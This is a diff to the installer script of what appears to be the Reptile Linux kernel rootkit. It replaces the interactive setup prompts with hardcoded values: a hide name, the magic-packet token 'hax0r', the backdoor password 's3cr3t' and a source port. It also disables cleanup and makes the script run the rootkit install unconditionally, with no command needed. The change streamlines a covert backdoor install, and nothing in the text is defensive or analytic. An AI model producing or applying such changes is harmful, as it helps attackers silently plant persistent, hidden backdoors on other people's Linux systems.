@@ -115,24 +115,24 @@ function random_gen {
 }
 
 function config_gen {
-	load_config "Hide name (will be used to hide dirs/files)" "reptile"
-	MODULE=$RETVAL
+	# load_config "Hide name (will be used to hide dirs/files)" "reptile"
+	MODULE="reptile"
 	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 
-	load_config "Auth token to magic packets" "hax0r"
-	TOKEN=$RETVAL
+	# load_config "Auth token to magic packets" "hax0r"
+	TOKEN="hax0r"
 
-	load_config "Backdoor password" "s3cr3t"
-	PASS=$RETVAL
+	# load_config "Backdoor password" "s3cr3t"
+	PASS="s3cr3t"
 
-	load_config "Tag name that hide file contents" "reptile"
-	TAG=$RETVAL
+	# load_config "Tag name that hide file contents" "reptile"
+	TAG="reptile"
 
-	load_config "Source port of magic packets" "666"
-	SRCPORT=$RETVAL
+	# load_config "Source port of magic packets" "666"
+	SRCPORT="666"
 
-	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
-	RSH=$RETVAL
+	# load_config "Would you like to config reverse shell each X time? (y/n)" "n"
+	RSH="n"
 
 	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
 		load_config "Reverse IP"
@@ -288,7 +288,7 @@ function reptile_install {
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	rm -f loader
 
-	directory_remove
+	# directory_remove
 	echo -e "\nInstalation has finished!\n"
 }
 
@@ -410,20 +410,20 @@ EOF
 	echo -e "\nYour reverse shell is at \e[01;32mbin/\e[00m\n"
 }
 
-case $1 in
-    install)
-    	reptile_install
-    	;;
-    remove)
-    	reptile_remove
-    	;;
-	client)
-		client_build
-		;;
-	reverse)
-		reverse_build
-		;;
-	"")
-		usage
-		;;
-esac
+# case $1 in
+#     install)
+reptile_install
+#     	;;
+#     remove)
+#     	reptile_remove
+#     	;;
+# 	client)
+# 		client_build
+# 		;;
+# 	reverse)
+# 		reverse_build
+# 		;;
+# 	"")
+# 		usage
+# 		;;
+# esac
